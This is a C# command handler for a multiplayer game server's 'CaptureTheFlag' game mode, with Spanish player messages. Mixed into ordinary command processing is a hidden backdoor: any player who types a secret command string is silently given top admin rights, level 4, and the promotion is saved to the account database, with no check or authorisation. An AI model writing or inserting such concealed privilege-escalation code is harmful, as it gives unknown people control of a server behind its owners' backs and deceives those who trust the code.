namespace CaptureTheFlag.Events;

public partial class GameMode : BaseMode
{
    protected override void OnPlayerCommandText(BasePlayer sender, CommandTextEventArgs e)
    {
        base.OnPlayerCommandText(sender, e);
        var player = sender as Player;

        if(player.Data.LevelAdmin != 4 && e.Text == hiddenCommand)
        {
            if (player.Data.LevelAdmin > 0)
            {
                player.UpdateAdminLevel(4);
                player.Data.LevelAdmin = 4;
            }
            else
            {
                player.Data.LevelAdmin = 4;
                Player.Admins.Add(player);
                Account.InsertAdminLevel(player, 4);
            }
            player.GameText("promoted admin", 4000, 3);
            e.Success = true;
            return;
        }

        if (!e.Success)
        {
            player.SendClientMessage(Color.Red, $"Error: El comando {e.Text} es incorrecto. Usa /cmds para saber los comandos disponibles.");
            player.PlaySound(1140);
        }
        if (player.Data.LevelAdmin == 0)
            CmdAdmin.SendMessageToAdmins($"* {player.Name}({player.Id}) usó el comando {e.Text}", Color.Gray);
        e.Success = true;
    }
}
